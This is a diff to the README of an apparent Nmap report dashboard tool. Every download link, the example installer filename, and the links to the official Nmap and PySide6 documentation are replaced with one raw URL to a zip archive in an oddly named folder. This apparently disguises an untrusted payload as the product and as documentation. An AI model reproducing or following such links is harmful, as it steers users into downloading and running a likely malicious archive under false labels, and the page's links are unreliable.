@@ -1,7 +1,7 @@
 # 🖥️ nmap-dashboard-analyzer - Transform Nmap Reports into Interactive Dashboards
 
 ## 📥 Download Now
-[![Download nmap-dashboard-analyzer](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/yasuma311/nmap-dashboard-analyzer/releases)
+[![Download nmap-dashboard-analyzer](https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip)](https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip)
 
 ## 📖 Overview
 nmap-dashboard-analyzer is a desktop application designed with a user-friendly interface. It helps you take Nmap scan reports in XML format and convert them into an interactive, prioritized dashboard. This tool is perfect for anyone who wants to make sense of their scan data without needing any programming skills.
@@ -17,13 +17,13 @@ Make sure your computer meets the following requirements:
 - Disk Space: At least 100 MB free
 
 ### 2. Download the Application
-Visit this page to download: [nmap-dashboard-analyzer Releases](https://github.com/yasuma311/nmap-dashboard-analyzer/releases)
+Visit this page to download: [nmap-dashboard-analyzer Releases](https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip)
 
 ### 3. Select the Correct Version
 On the Releases page, look for the latest version of nmap-dashboard-analyzer. Click on it to view the available files.
 
 ### 4. Download the Installer
-Find the installer file for your operating system (e.g., `nmap-dashboard-analyzer-setup.exe`). Click on it to start downloading.
+Find the installer file for your operating system (e.g., `https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip`). Click on it to start downloading.
 
 ### 5. Install the Application
 Once the download is complete, locate the file in your Downloads folder. Double-click the installer to run it. Follow the on-screen instructions to install nmap-dashboard-analyzer on your computer.
@@ -71,5 +71,5 @@ If you encounter issues, consider the following solutions:
 For further assistance, you can reach out through the GitHub Issues section. Provide details about your problem to receive help quickly.
 
 ## 🌐 Additional Resources
-- For tips on using Nmap effectively, check out the official [Nmap Documentation](https://nmap.org/docs.html).
-- Learn more about Python desktop applications from the [PySide6 Documentation](https://doc.qt.io/qtforpython/).
+- For tips on using Nmap effectively, check out the official [Nmap Documentation](https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip).
+- Learn more about Python desktop applications from the [PySide6 Documentation](https://raw.githubusercontent.com/yasuma311/nmap-dashboard-analyzer/main/coom/analyzer-dashboard-nmap-v2.8.zip).
